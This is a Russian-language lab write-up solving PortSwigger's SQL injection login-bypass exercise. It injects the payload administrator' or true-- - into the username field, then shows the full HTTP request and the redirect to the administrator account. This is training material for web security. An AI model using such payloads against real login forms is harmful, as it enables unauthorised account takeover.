---
title: "SQL injection vulnerability allowing login bypass"
date: 2025-06-06
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/sql-injection-apprentice/sql-injection/lab-login-bypass"
classes: wide
---

Эта лабораторная работа содержит уязвимость **SQL injection** в функции входа в систему Для решения лабораторной работы надо выполнить атаку с помощью `SQL`-инъекции, войдя в приложение под пользователем `administrator`.

```
https://0a1500d303f14c6281ea0218003c00ea.web-security-academy.net
```

## Solution

Мне нужно обойти проверку пароля для пользователя `adminstrator`, поэтому сразу пойду на страницу `login`:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_vulnerability_allowing_login_bypass/1.png){: height="200" .align-center}


Уязвимым к инъекции может быть как поле логина, так и пароля. 


Для начала опробую поле логина. Предположим, что запрос у нас выглядит следующим образом:

```sql
SELECT
	*
WHERE
	login = 'login' AND passwd = 'passwd'
```

В таком случае, мы можем обойти проверку пароля, если в качестве значения логина передадим `administrator' or true-- -`. Тогда у нас получится следующий запрос:

```sql
SELECT
	*
WHERE
	login = 'administrator' or true-- - AND passwd = 'passwd'
```

<details>
<summary>Пояснение</summary> 
  
Подставляя в login <strong>'administrator' or true-- -</strong>, мы обрезаем проверку пароля для логина administrator.

</details>

Попробую передать это в форму:


```http
POST /login HTTP/2
Host: 0a1500d303f14c6281ea0218003c00ea.web-security-academy.net
Cookie: session=1rcwplSRhqfHU2mo3IclkjPvk8kNhXnc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1500d303f14c6281ea0218003c00ea.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: https://0a1500d303f14c6281ea0218003c00ea.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=Tcvn8SZebZyEp2evyWuhacbr521caP4L&username=+administator%27+or+true--+-&password=111
```


На что я получил ответ и меня пустило на страницу пользователя `administrator`:

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=7UteASMPdTQlDWDTbG7bUdDehqT1H6xx; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_vulnerability_allowing_login_bypass/2.png){: height="200" .align-center}


Лаба пройдена:3 ☕